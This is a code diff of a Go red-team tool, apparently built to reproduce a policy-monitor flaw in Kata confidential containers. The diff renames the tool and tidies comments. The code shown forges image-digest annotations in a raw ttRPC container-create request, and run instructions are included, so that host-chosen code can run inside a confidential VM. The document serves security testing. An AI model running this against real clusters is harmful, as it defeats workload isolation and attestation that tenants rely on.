@@ -1,4 +1,4 @@
-// katahostcreate is a host-side red-team tool (c8s RT-003). It connects to a
+// kata-host-create is a host-side tool for reproducing the c8s policy-monitor annotation-forgery issue (docs/security/RT-003-policy-monitor-host-annotations.md). It connects to a
 // running kata guest's agent over vsock and issues a raw ttRPC
 // CreateContainerRequest — exactly what the kata shim is allowed to do, and
 // therefore exactly what anyone controlling the host (kubelet, containerd,
@@ -12,20 +12,20 @@
 // Against a guest with no policy-monitor (the pre-2026-07-22 deployment
 // posture) the container simply runs: arbitrary host-chosen code inside a
 // "confidential" TDX CVM. Against a policy-monitor that trusts the
-// host-authored annotations (RT-003 vulnerable versions) the forged digest
+// host-authored annotations (pre-fix versions) the forged digest
 // is accepted and the container is allowed. The fixed monitor instead
 // trusts only the agent-stamped c8s-pulled-image ref and kills it.
 //
 // Build (needs the kata-containers checkout for the generated bindings):
 //
-//	cd test/redteam/katahostcreate
+//	cd test/kata-host-create
 //	KATA=/path/to/kata-containers/src/runtime go mod edit -replace \
 //	  github.com/kata-containers/kata-containers/src/runtime=$KATA
 //	go build .
 //
 // Run (as root on the k8s node):
 //
-//	sudo ./katahostcreate -cid <guest-cid> -sandbox <sandbox-id> \
+//	sudo ./kata-host-create -cid <guest-cid> -sandbox <sandbox-id> \
 //	  -image docker.io/library/alpine:3.20 \
 //	  -forged-image-id sha256:<allowlisted-digest>
 package main
@@ -92,9 +92,9 @@ func main() {
 	rootfsGuestPath := fmt.Sprintf("/run/kata-containers/%s/rootfs", *containerID)
 
 	annotations := map[string]string{
-		"io.kubernetes.cri.container-type": "container",
-		"io.kubernetes.cri.image-name":     *image, // host-chosen pull ref
-		"io.kubernetes.cri.sandbox-id":     *sandbox,
+		"io.kubernetes.cri.container-type":      "container",
+		"io.kubernetes.cri.image-name":          *image, // host-chosen pull ref
+		"io.kubernetes.cri.sandbox-id":          *sandbox,
 		"io.katacontainers.pkg.oci.bundle_path": "/run/kata-containers/" + *containerID,
 	}
 	if *forgedID != "" {
@@ -110,11 +110,11 @@ func main() {
 	spec := &specs.Spec{
 		Version: "1.0.2",
 		Process: &specs.Process{
-			Args:        args,
-			Cwd:         "/",
-			Terminal:    false,
-			Env:         []string{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},
-			Capabilities: caps,
+			Args:            args,
+			Cwd:             "/",
+			Terminal:        false,
+			Env:             []string{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},
+			Capabilities:    caps,
 			NoNewPrivileges: true,
 		},
 		Root: &specs.Root{Path: rootfsGuestPath},
